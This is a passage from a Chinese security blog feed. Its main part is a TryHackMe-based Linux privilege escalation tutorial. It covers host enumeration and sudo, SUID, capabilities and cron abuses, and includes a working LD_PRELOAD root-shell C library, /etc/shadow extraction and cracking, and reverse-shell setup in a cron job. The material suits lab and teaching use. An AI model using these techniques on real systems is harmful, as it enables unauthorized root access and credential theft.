+<p><img src="/images/1-3-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AE%83%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/image-20230228154059188.png" alt="image-20230228154059188"></p>
+<p>有可能在不知道 k 的情况下恢复信息吗？实际上，这是一件很容易做到的事情，因为只存在26个可能的密钥。因此我们可以使用每个可能的密钥尝试解密密文，于是我们可以得到一个含有 26 个候选明文的列表。正确的明文肯定会在列表中；更一般地，如果密文足够长，那么正确的明文将可能是列表中唯一看起来有意义的候选。通过扫描候选的列表，我们很容易恢复原始明文。（这并不一定为真，但大部分时候是真的，即使不为真，该攻击也会将可能明文的集合压缩到至多26种可能）</p>
+<p>涉及到尝试每个可能密钥的攻击被称为蛮力或穷举搜索攻击。显然地，对一个安全的加密方案来说，其一定要在这种攻击下不是脆弱的。这个观察被称为 <strong>充足的密钥空间原则</strong>：</p>
+<blockquote>
+<p>任何安全的加密方案一定要有一个足够大的密钥空间，使得穷举搜索攻击不可行</p>
+</blockquote>
+<p>我们可以反复思考一下多少努力使得一个任务是不可行的。可行性的一个精确的确定即依赖于潜在攻击者所拥有的资源，也依赖于发送者和接收者想要确保它们通信的私密性的时间长度。</p>
+<p>在当下，攻击者可以使用超级计算机、上千个云服务器或是GPUs 来加快蛮力攻击。为对抗这样的攻击，密钥空间一定要非常大。在许多场景下，至少要有 $2^{80}$ 或是更大。</p>
+<p>充足的密钥空间原则给出了安全性的一个必要条件，但没有给出一个充分条件。下面的例子证明了这一点：</p>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>现代密码学学导论</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux提权</title>
+    <url>/2023/03/03/Linux%E6%8F%90%E6%9D%83/index.html</url>
+    <content><![CDATA[<h6 id="tags-tryhackme"><a href="#tags-tryhackme" class="headerlink" title="tags: tryhackme"></a>tags: <code>tryhackme</code></h6><h1 id="linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h1><span id="more"></span>
+
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本篇文章主要学习基础的 Linux 提权技巧。从暴力破解到漏洞利用，实操8个不同的提权技巧。</p>
+<h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><p>提权是一个循序渐进的过程，不能一蹴而就。大部分提权手法都取决于目标系统的配置。<br>内核版本、已安装的应用、支持的编程语言以及其他用户的密码都是我们提权到 root 权限的关键点。</p>
+<p>本篇文章主要涵盖一些主要的提权手法，希望能让您对提权过程有一个更好的理解。</p>
+<h2 id="0x03-什么是提权"><a href="#0x03-什么是提权？" class="headerlink" title="0x03 什么是提权？"></a>0x03 什么是提权？</h2><h3 id="提权意味着什么"><a href="#提权意味着什么？" class="headerlink" title="提权意味着什么？"></a>提权意味着什么？</h3><p>顾名思义，提权通常涉及到从一个低权限的账户到一个高权限的账户。用更技术的话来说，提权是利用操作系统或应用程序的漏洞、设计缺陷或配置疏忽等来获得对用户有限制的资源的未授权访问。</p>
+<h3 id="为什么提权很重要"><a href="#为什么提权很重要？" class="headerlink" title="为什么提权很重要？"></a>为什么提权很重要？</h3><p>在实际的渗透过程中，很少可以直接拿到一个具有管理员权限的 shell。<br>因为提权能让你获得系统管理员级别的访问权限，所以提权是至关重要的。提权允许你进行以下操作：</p>
+<ul>
+<li>重置密码</li>
+<li>绕过访问控制并损害受保护的数据</li>
+<li>编辑软件配置</li>
+<li>权限维持 Enabling persistence</li>
+<li>改变已存在的用户的权限</li>
+<li>执行任意管理员权限命令</li>
+</ul>
+<h3 id="枚举主机信息"><a href="#枚举主机信息" class="headerlink" title="枚举主机信息"></a>枚举主机信息</h3><p>枚举什么呢？当然是枚举主机上的各种信息。</p>
+<p>一旦你已获得系统的访问权限，枚举就是你要做的第一件事。<br>实际的渗透不像 CTF 在拿到特定系统的访问权限就结束。枚举在 post-compromise 阶段和它之前一样重要。下面介绍一些常见的枚举主机信息的手段。</p>
+<h4 id="1-hostname-命令"><a href="#1-hostname-命令" class="headerlink" title="1. hostname 命令"></a>1. hostname 命令</h4><p><code>hostname</code> 命令将会返回目标主机的主机名。尽管该值可被轻易改变或是含有一个相对无意义的字符串（比如 Ubuntu-3487340239）。但在某些情况下，<code>hostname</code> 命令可提供目标系统在组织网络内所充当的角色信息。（比如 SQL-PROD-01 表明这是一台 SQL 服务器）</p>
+<h4 id="2-uname-a-命令"><a href="#2-uname-a-命令" class="headerlink" title="2. uname -a 命令"></a>2. uname -a 命令</h4><p>该命令将会打印系统信息，给我们一个有关系统所用内核的额外细节。当我们寻找潜在的内核提权漏洞时，该信息特别有用。</p>
+<h4 id="x2fprocx2fversion-文件"><a href="#x2F-proc-x2F-version-文件" class="headerlink" title="&#x2F;proc&#x2F;version 文件"></a>&#x2F;proc&#x2F;version 文件</h4><p>proc 文件系统(procfs) 提供有关目标系统进程的信息。你可在许多不同的 Linux 发行版中找到 proc，这使其成为你的武器库中的一个重要工具。<br> <code>/proc/version</code> 将给你内核版本信息以及一些额外的数据。比如是否安装了编译器（例如 GCC）</p>
+<h4 id="x2fetcx2fissue-文件"><a href="#x2F-etc-x2F-issue-文件" class="headerlink" title="&#x2F;etc&#x2F;issue 文件"></a>&#x2F;etc&#x2F;issue 文件</h4><p>通过查看 <code>/etc/issue</code> 文件可以确定系统类型。这个文件通常包含一些关于操作系统的信息，但是可以被轻易地改变或定制。所有包含系统信息的文件都可被定制化或改变，所以为了对系统有一个更好的理解，最好是把所有相关的文件都查看一下。</p>
+<h4 id="ps-命令"><a href="#ps-命令" class="headerlink" title="ps 命令"></a>ps 命令</h4><p>在 Linux 系统上，<code>ps</code> 命令是一个查看运行中的进程的一个高效的方式。</p>
+<p><code>ps</code>（Process Status） 的输出将会展示以下信息：</p>
+<ul>
+<li>PID：进程 ID（对进程来说是唯一的）</li>
+<li>TTY：用户所用的终端类型</li>
+<li>Time：进程使用的 CPU 时间数（这不是进程已运行的时间）</li>
+<li>CMD：正在运行的命令或可执行文件（将不会展示任意的命令行参数）</li>
+</ul>
+<p><code>ps</code> 命令提供了一些有用的选项：</p>
+<ul>
+<li>ps-A：查看所有运行着的进程</li>
+<li>ps axjf：查看进程树，如下图：</li>
+</ul>
+<p><img src="https://i.imgur.com/gzmcqTg.png"></p>
+<ul>
+<li>ps aux：</li>
+</ul>
+<h4 id="env-命令"><a href="#env-命令" class="headerlink" title="env 命令"></a>env 命令</h4><p><code>env</code> 命令将显示环境变量。</p>
+<p><img src="https://i.imgur.com/eGrJOFn.png"></p>
+<p>PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于特权升级。</p>
+<h4 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h4><p>目标系统可以配置为允许用户以 root 权限运行一些（或所有）命令。 <code>sudo -l</code> 命令可用于列出您的用户可以使用 <code>sudo</code> 运行的所有命令。</p>
+<h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>Linux 中常用的命令之一可能是 <code>ls</code>。</p>
+<p>在寻找潜在的特权升级向量时，请记住始终使用带有 <code>-la</code> 参数的 <code>ls</code> 命令。下面的示例显示了使用 ls 或 ls -l 命令时遗漏了 “secret.txt” 文件的情况。</p>
+<p><img src="https://i.imgur.com/2KaaBLT.png"></p>
+<h4 id="id-命令"><a href="#id-命令" class="headerlink" title="id 命令"></a>id 命令</h4><p><code>id</code> 命令将提供用户权限级别和组成员身份的总体概览。 值得记住的是，<code>id</code> 命令也可用于获取另一个用户的相同信息，如下所示。</p>
+<p><img src="https://i.imgur.com/5MJJZK2.png"></p>
+<h4 id="x2fetcx2fpasswd-文件"><a href="#x2F-etc-x2F-passwd-文件" class="headerlink" title="&#x2F;etc&#x2F;passwd 文件"></a>&#x2F;etc&#x2F;passwd 文件</h4><p>读取 <code>/etc/passwd</code> 文件是发现系统用户的一种简单方法。</p>
+<p><img src="https://i.imgur.com/QsYnLCs.png"></p>
+<p>虽然输出可能很长而且有点吓人，但它可以很容易地被剪切并转换成一个有用的列表以用于暴力攻击。</p>
+<p><img src="https://i.imgur.com/W4Knz1t.png"></p>
+<p>请记住，这将返回所有用户，其中有一些不是很有用的系统或服务用户。另一种方法可能是 grep 查找 “home” ，因为真实用户很可能将他们的文件夹放在 “home” 目录下。</p>
+<p><img src="https://i.imgur.com/ECddRM6.png"></p>
+<h4 id="history"><a href="#history" class="headerlink" title="history"></a>history</h4><p>使用 <code>history</code> 命令查看较早的命令可以让我们对目标系统有一些了解，并且尽管很少发生，但之前的命令可能存储了密码或用户名等信息。</p>
+<h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>目标系统可能是另一个网络的枢轴点。 <code>ifconfig</code> 命令将为我们提供有关系统网络接口的信息。下面的示例显示目标系统具有三个接口（eth0、tun0 和 tun1）。我们的攻击机器可以到达 eth0 接口，但不能直接访问其他两个网络。</p>
+<p><img src="https://i.imgur.com/WqpJcMZ.png"></p>
+<p>这可以使用 <code>ip route</code> 命令确认，以查看存在哪些网络路由。</p>
+<p><img src="https://i.imgur.com/teDg35x.png"></p>
+<h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>在对现有接口和网络路由进行初步检查后，可以尝试查看现有通信。 <code>netstat</code> 命令可以与几个不同的选项一起使用，以收集有关现有连接的信息。</p>
+<ul>
+<li><code>netstat -a</code>：显示所有侦听端口和已建立的连接。</li>
+<li><code>netstat -at</code> 或 <code>netstat -au</code> 可分别列出 TCP 或 UDP 协议的连接</li>
+<li><code>netstat -l</code>：列出处于 “侦听” 模式的端口。这些端口已打开并准备好接受传入连接。这可以与 “t” 选项一起使用，以仅列出使用 TCP 协议侦听的端口（如下）</li>
+</ul>
+<p><img src="https://i.imgur.com/iO4je25.png"></p>
+<ul>
+<li><code>netstat -s</code>：按协议列出网络使用的统计信息（如下）这也可以与 <code>-t</code> 或 <code>-u</code> 选项一起使用，以将输出限制为特定协议。</li>
+</ul>
+<p><img src="https://i.imgur.com/zA8luIS.png"></p>
+<ul>
+<li><code>netstat -tp</code>：列出带有服务名称和 PID 信息的连接。</li>
+</ul>
+<p><img src="https://i.imgur.com/1iWjl59.png"></p>
+<p>这也可以与 <code>-l</code> 选项一起使用以列出监听端口（如下）</p>
+<p><img src="https://i.imgur.com/p8T119D.png"></p>
+<p>我们可以看到 “PID&#x2F;Program name” 列是空的，因为这个进程属于另一个用户。 使用 root 权限再运行该命令一次，可以看到此信息显示为 2641&#x2F;nc (netcat)</p>
+<p><img src="https://i.imgur.com/YlKvanS.png"></p>
+<ul>
+<li><code>netstat -i</code>：显示接口统计信息。我们在下面看到 “eth0” 和 “tun0” 比 “tun1” 更活跃。</li>
+</ul>
+<p><img src="https://i.imgur.com/qdHbOyu.png"></p>
+<p>您在博客文章、文章和课程中最常看到的 <code>netstat</code> 用法是 <code>netstat -ano</code>，它可以细分如下：</p>
+<ul>
+<li>-a：显示所有套接字</li>
+<li>-n：不解析主机名</li>
+<li>-o：显示计时器</li>
+</ul>
+<p><img src="https://i.imgur.com/gpd4Ub8.png"></p>
+<h4 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h4><p>在目标系统中搜索重要信息和潜在的特权升级向量可能会很有成效。内置的 “find” 命令很有用，值得保留在您的武器库中。 以下是 “find” 命令的一些有用示例。</p>
+<p><strong>查找文件：</strong></p>
+<ul>
+<li><code>find . -name flag1.txt</code>：在当前目录下查找名为 “flag1.txt” 的文件。</li>
+<li><code>find /home -name flag1.txt</code>：在 &#x2F;home 目录下查找名为 “flag1.txt” 的文件</li>
+<li><code>find / -type d -name config</code>：在 &#x2F; 目录下查找名为 config 的目录</li>
+<li><code>find / -type f -perm 0777</code>：在根目录下查找具有 777 权限的文件（777 表示所有用户可读、可写、可执行）</li>
+<li><code>find / -perm a=x</code>：在根目录下查找可执行文件</li>
+<li><code>find /home -user frank</code>：在 &#x2F;home 目录下查找用户 ”frank“ 的所有文件</li>
+<li><code>find / -mtime 10</code>：在根目录下查找最近十天内修改过的文件</li>
+<li><code>find / -atime 10</code>：在根目录下查找最近十天内访问过的文件。</li>
+<li><code>find / -cmin -60</code>：在根目录下查找在最近一小时内改变过的文件（60 分钟）</li>
+<li><code>find / -amin -60</code>：在根目录下查找在最近一小时内访问过的文件（60 分钟）</li>
+<li><code>find / -size 50M</code>：在根目录下查找大小为 50MB 的文件。此命令还可以与 (+) 和 (-) 符号一起使用，以指定大于或小于给定大小的文件。</li>
+</ul>
+<p><img src="https://i.imgur.com/HoMc2Ij.png"></p>
+<p>上面的示例返回大于 100 MB 的文件。重要的是要注意 “find” 命令往往会产生错误，有时会使输出难以阅读。这就是为什么明智的做法是使用带有 “-type f 2&gt;&#x2F;dev&#x2F;null” 选项的 “find” 命令将错误重定向到 “&#x2F;dev&#x2F;null” 并获得更清晰的输出（如下）。</p>
+<p><img src="https://i.imgur.com/t19UFTW.png"></p>
+<p>以下三个命令在根目录下查找可写的文件夹：</p>
+<ul>
+<li><code>find / -writable -type d 2&gt;/dev/null</code></li>
+<li><code>find / -perm -222 -type d 2&gt;/dev/null</code></li>
+<li><code>find / -perm -o w -type d 2&gt;/dev/null</code></li>
+</ul>
+<p>我们看到三个可能导致相同结果的不同 “find” 命令的原因可以在手册文档中看到。正如您在下面看到的，perm 参数会影响 “find” 的工作方式。</p>
+<p><img src="https://i.imgur.com/514OZ1V.png"></p>
+<p>以下命令在根目录下查找可以执行的目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -o x -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>以下命令在根目录下查找开发工具和支持的编程语言：</p>
+<ul>
+<li><code>find / -name perl*</code></li>
+<li><code>find / -name python*</code></li>
+<li><code>find / -name gcc*</code></li>
+</ul>
+<p><strong>查找具有特定权限的文件</strong></p>
+<p>下面是一个简短的示例，用于查找设置了 SUID 位的文件。 SUID 位允许文件以拥有它的帐户的特权级别运行，而不是运行它的帐户，这导致了一个有趣的提权手法。</p>
+<ul>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：在根目录下查找带有 SUID 位的文件，这允许我们以比当前用户更高的权限级别运行该文件。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -writable -<span class="hljs-built_in">type</span> d 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x04-内核漏洞提权"><a href="#0x04-内核漏洞提权" class="headerlink" title="0x04 内核漏洞提权"></a>0x04 内核漏洞提权</h2><h2 id="0x05-sudo-提权"><a href="#0x05-Sudo-提权" class="headerlink" title="0x05 Sudo 提权"></a>0x05 Sudo 提权</h2><p>sudo 命令默认允许你以 root 权限运行一个程序。在一些情况下，系统管理员可能需要为普通用户提供一些灵活的权限。<br>举个例子，初级 SOC 分析师可能需要定期使用 Nmap，但不会获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。</p>
+<p>任何用户都可以使用 <code>sudo -l</code> 命令查看其当前与 root 权限相关的情况。</p>
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。例如 namp 具有 sudo 权限时，如何通过其得到一个 root shell。</p>
+<h3 id="1-利用应用程序功能"><a href="#1-利用应用程序功能" class="headerlink" title="1. 利用应用程序功能"></a>1. 利用应用程序功能</h3><p>有些应用程序运行时是以 sudo 权限运行的，如果该应用程序具有一些能读取或加载文件的选项，那么我们就可以利用这个选项来进行一些提权操作。</p>
+<p>例如以下的 Apache2 应用。Apache2 有一个选项支持加载备用配置文件（<code>-f</code>：指定备用 ServerConfigFile）。</p>
+<p><img src="https://i.imgur.com/eZcZfsW.png"></p>
+<p>使用此选项加载 <code>/etc/shadow</code> 文件将导致包含 &#x2F;etc&#x2F;shadow 文件第一行的错误消息。</p>
+<h3 id="2-利用-ld_preload"><a href="#2-利用-LD-PRELOAD" class="headerlink" title="2. 利用 LD_PRELOAD"></a>2. 利用 LD_PRELOAD</h3><p>在某些系统上，您可能会看到 LD_PRELOAD 环境选项。</p>
+<p><img src="https://i.imgur.com/MmjqURa.png"></p>
+<p>LD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">文章</a>将让您了解 LD_PRELOAD 的功能。如果启用 “env_keep” 选项，我们可以生成一个共享库，它将在程序运行之前加载和执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略。</p>
+<p>这个特权升级向量的步骤可以总结如下:</p>
+<ol>
+<li>检查 LD_PRELOAD（使用 env_keep 选项）</li>
+<li>编写编译为共享对象（.so 扩展名）文件的简单 C 代码</li>
+<li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li>
+</ol>
+<p>以下 C 代码将简单地生成一个 root shell：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以将此代码保存为 shell.c，并使用以下参数使用 gcc 将其编译为共享对象文件；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/lRjTXOd.png"></p>
+<p>当我们运行具有 sudo 权限的任意程序时，我们就可以使用以上的共享对象文件。在我们的例子中，可以使用 Apache2、find 或几乎任何我们可以使用 sudo 运行的程序。</p>
+<p><strong>回答以下问题：</strong></p>
+<ul>
+<li>用户 “karen” 可在目标系统上执行多少个具有sudo 权限的程序？</li>
+<li>如果您的用户对 nmap 具有 sudo 权限，您将如何使用 Nmap 生成 root shell？</li>
+<li>frank 密码的哈希值是多少？（用sudo -l 看到的 nano 去读 &#x2F;etc&#x2F;shadow）</li>
+</ul>
+<h2 id="0x06-suid-提权"><a href="#0x06-SUID-提权" class="headerlink" title="0x06 SUID 提权"></a>0x06 SUID 提权</h2><p>许多 Linux 权限控制依赖于控制用户和文件的交互，这是通过权限完成的。到目前为止，您知道文件可以具有读取、写入和执行权限。Linux 根据用户的权限级别分配文件权限。这随着 SUID（Set-user Identification）和 SGID（Set-group Identification）而改变。这两项标识允许用户分别以文件所有者和文件组所有者的权限级别来执行文件。</p>
+<p>您会注意到这些文件设置了一个 “s” 位来显示它们的特殊权限级别。</p>
+<p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> 将列出设置了 SUID 或 SGID 位的文件。</p>
+<p><img src="https://i.imgur.com/zcWSSN0.png"></p>
+<p>一个好的做法是将此列表中的可执行文件与 GTFOBins (<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>) 进行比较。单击 SUID 按钮将在设置 SUID 位时过滤已知可利用的二进制文件（您也可以使用此链接获取预过滤列表 <a href="https://gtfobins.github.io/#+suid%EF%BC%89%E3%80%82">https://gtfobins.github.io/#+suid）。</a></p>
+<p>上面的列表显示 nano 设置了 SUID 位。不幸的是，GTFObins 并没有让我们轻松获胜。典型的现实生活中的特权升级场景，我们需要找到中间步骤来帮助我们利用我们所拥有的任何微小发现。</p>
+<p><img src="https://i.imgur.com/gnTa9tK.png"></p>
+<p>为 nano 文本编辑器设置的 SUID 位允许我们使用文件所有者的权限创建、编辑和读取文件。 Nano 由 root 拥有，这可能意味着我们可以以比当前用户更高的权限级别读取和编辑文件。在这个阶段，我们有两个基本的权限提升选项：读取 <code>/etc/shadow</code> 文件或将我们的用户添加到 <code>/etc/passwd</code>。</p>
+<p>以下是使用这两种向量的简单步骤。</p>
+<ol>
+<li>读取 <code>/etc/shadow</code> 文件</li>
+<li>通过运行 <code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> 命令我们可以看到 nano 文本编辑器设置了 SUID 比特位。</li>
+<li><code>nano /etc/shadow</code> 将打印 <code>/etc/shadow</code> 文件的内容。我们现在可以使用 unshadow 工具创建一个可被 John the Ripper 破解的文件。为此，unshadow 需要 <code>/etc/shadow</code> 和 <code>/etc/passwd</code> 文件。</li>
+</ol>
+<p><img src="https://i.imgur.com/yTMffvw.png"></p>
+<p>unshadow 工具的用法如下所示:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">unshadow passwd.txt shadow.txt &gt; passwords.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/WO1iHXE.png"></p>
+<p>有了正确的单词表和一点运气， John the Ripper 可以以明文形式返回一个或多个密码。有关 John the Ripper 的更详细的房间，您可以访问 <a href="https://tryhackme.com/room/johntheripper0">https://tryhackme.com/room/johntheripper0</a></p>
+<p>另一种选择是添加一个具有 root 权限的新用户。这将帮助我们规避繁琐的密码破解过程。下面是一个简单的方法来做到这一点：</p>
+<p>我们需要新建用户的密码哈希值。这可以使用 Kali Linux 上的 openssl 工具快速完成。 </p>
+<p><img src="https://i.imgur.com/MCZkRp4.png"></p>
+<p>然后，我们会将此密码和用户名添加到 <code>/etc/passwd</code> 文件中。</p>
+<p><img src="https://i.imgur.com/g1dHAD2.png"></p>
+<p>添加用户后（请注意如何使用 root:&#x2F;bin&#x2F;bash 提供 root shell）我们将需要切换到该用户并希望拥有 root 权限。</p>
+<p><img src="https://i.imgur.com/LB9NTdG.png"></p>
+<h2 id="0x07-capabilities-提权"><a href="#0x07-Capabilities-提权" class="headerlink" title="0x07 Capabilities 提权"></a>0x07 Capabilities 提权</h2><p>系统管理员可以用来提高进程或二进制文件特权级别的另一种方法是 “Capabilities”（功能）。Capabilities 有助于在更精细的级别管理权限。<br>例如，如果 SOC 分析师需要使用需要发起套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想给这个用户更高的权限，他们可以更改二进制文件的功能。因此，二进制文件无需更高权限的用户即可完成任务。</p>
+<p>capabilities 手册页提供了有关其用法和选项的详细信息。</p>
+<p>我们可以使用 <code>getcap</code> 工具列出启用的 capabilities。</p>
+<p><img src="https://i.imgur.com/yhcR76Z.png"></p>
+<p>当以非特权用户身份运行时，<code>getcap -r /</code> 会产生大量错误，因此最好将错误消息重定向到 &#x2F;dev&#x2F;null。</p>
+<p>请注意，vim 及其副本都没有设置 SUID 位。因此，在枚举查找 SUID 的文件时，无法发现此特权升级向量。</p>
+<p><img src="https://i.imgur.com/qBhUfDi.png"></p>
+<p>GTFObins 有一个很好的二进制文件列表，如果我们发现任何设置的 capabilities，可以利用这些二进制文件进行特权升级。 我们注意到 vim 可以与以下命令和有效负载一起使用：</p>
+<p><img src="https://i.imgur.com/o2vFRFm.png"></p>
+<p>这将启动一个 root shell，如下所示；</p>
+<p><img src="https://i.imgur.com/oHnwfki.png"></p>
+<p><strong>回答下列问题：</strong></p>
+<ol>
+<li>有多少二进制文件设置了 capabilities？</li>
+</ol>
+<p>使用 <code>getcap -r / 2&gt;/dev/null</code> 命令即可</p>
+<ol start="3">
+<li>flag4.txt 文件的内容是什么？</li>
+</ol>
+<p>用 vim 或 view 的功能提权都可以。记得把 py 换成 py3</p>
+<p><img src="https://i.imgur.com/gwPIl2U.png"></p>
+<h2 id="提权定时任务"><a href="#提权：定时任务" class="headerlink" title="提权：定时任务"></a>提权：定时任务</h2><p>Cron job 定时任务用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者而非当前用户的权限运行。虽然正确配置的定时任务本身并不容易受到攻击，但它们可以在某些情况下提供特权升级向量。</p>
+<p>这个想法很简单：如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。</p>
+<p>定时任务配置被存储为 crontabs(crons tables)，以查看该任务下次将会被运行的时间和日期。</p>
+<p>系统上的每个用户都有他们的 crontab 文件，并且无论他们是否登录都可以运行特定的任务。如您所料，我们的目标是找到一个由 root 设置的定时任务并让它运行我们的脚本，最好是一个 shell。</p>
+<p>任何用户都可在 <code>/etc/crontab</code> 目录下读取系统内的定时任务文件。</p>
+<p>虽然 CTF 机器可以让定时任务每分钟或每 5 分钟运行一次，但在渗透测试活动中，您会更频繁地看到每天、每周或每月运行的任务。</p>
+<p><img src="https://i.imgur.com/QutPTQB.png"></p>
+<p>您可以看到 <code>backup.sh</code> 脚本被配置为每分钟运行一次。该文件的内容显示了一个创建 prices.xls 文件备份的简单脚本。</p>
+<p><img src="https://i.imgur.com/FRaztWL.png"></p>
+<p>由于我们当前的用户可以访问这个脚本，我们可以很容易地修改它来创建一个反向 shell 并希望具有 root 权限。</p>
+<p>但有两个点需要注意：</p>
+<ol>
+<li><p>命令语法会因可用工具而异。 （例如 <code>nc</code> 可能不支持您在其他情况下使用过的 -e 选项）</p>
+</li>
+<li><p>我们应该总是更喜欢启动反向 shell，因为我们不想在真正的渗透测试过程中损害系统的完整性。</p>
+</li>
+</ol>
+<p>所以 backup.sh 的内容应如下图：</p>
+<p><img src="https://i.imgur.com/nCCrhGX.png"></p>
+<p>我们现在将在我们的攻击机器上运行一个监听器来接收传入的连接。</p>
+<p><img src="https://i.imgur.com/bmOh0CG.png"></p>
+<p>Crontab 始终值得检查，因为它有时会导致简单的特权升级向量。以下场景在不具备一定网络安全成熟度级别的公司中并不少见：</p>
+<ol>
+<li>系统管理员需要定期运行脚本。</li>
+<li>他们创建了一个定时任务来执行此操作</li>
+<li>一段时间后，脚本变得无用，所以他们将其删除</li>
+<li>但他们未清理相关的定时任务</li>
+</ol>
+<p>此变更管理问题导致利用定时任务的潜在漏洞。</p>
+<p><img src="https://i.imgur.com/rPipHqi.png"></p>
+<p>上面的示例显示了类似的情况，其中删除了 antivirus.sh 脚本，但定时任务仍然存在。</p>
+<p>如果未定义脚本的完整路径（如对 backup.sh 脚本所做的那样），cron 将引用 &#x2F;etc&#x2F;crontab 文件中 PATH 变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个名为“antivirus.sh”的脚本，它应该由定时任务运行。</p>
+<p>目标系统上的文件应该看起来很熟悉：</p>
+<p><img src="https://i.imgur.com/tScWLdO.png"></p>
+<p>传入的反向 shell 连接具有 root 权限：</p>
+<p><img src="https://i.imgur.com/WtNhmNr.png"></p>
+<p>在奇怪的情况下，您会发现一个现有的脚本或任务附加到定时任务。花时间了解脚本的功能以及如何在上下文中使用任何工具总是值得的。<br>例如，tar、7z、rsync 等，可以使用它们的通配符功能进行利用。</p>
+]]></content>
+      <categories>
+        <category>tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Linux提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队基础</title>
+    <url>/2023/03/07/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>2023/3/26-优秀文章阅读记录</title>
+    <url>/2023/03/26/2023-3-26-%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/index.html</url>
+    <content><![CDATA[<p>很久没更新博客了，之前一直在 hackmd 上书写。</p>
+<span id="more"></span>
+<h1 id="2023326-优秀文章阅读记录"><a href="#2023-3-26-优秀文章阅读记录" class="headerlink" title="2023/3/26 优秀文章阅读记录"></a>2023/3/26 优秀文章阅读记录</h1><h2 id="1-红日安全代码审计day6"><a href="#1-红日安全代码审计DAY6" class="headerlink" title="1. 红日安全代码审计DAY6"></a>1. 红日安全代码审计DAY6</h2><p>今天参看了红日安全代码审计项目的 <a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day6/files/README.md">DAY6</a>，首先是分析了一个正则表达式使用不当导致任意文件删除的漏洞。其次审计了微擎 0.80 版本的一个 file_delete() 任意文件删除漏洞，该漏洞链整体不难，不过我们在利用漏洞时可能需要寻找一下入口页面，优先从相同目录下开始寻找。另外寻找 $_GPC 变量的源码定义着实费了我一番功夫，主要我的 phpstorm 当前项目下有太多其他文件导致，建议大家每天的审计单开一个项目。</p>
+<p>最后我们是做了一个 CTF 题目，说实话只要我们能看懂题目中的正则表达式的含义，那么离解题也就不远了。值得注意的是弱比较确实是弱比较，然而是使用字符串的 42 去弱比较的，最后的 payload 是利用科学计数法的形式绕过正则并且最终还弱相等的。说实话，我不是很理解 PHP 这个比较规则，现在不是两个字符串在比较吗？合理的猜测是 php 会把科学计数法表示的字符串转换成数字，之后再和字符串形式的 42 比较，这样又发送了一次类型转换。</p>
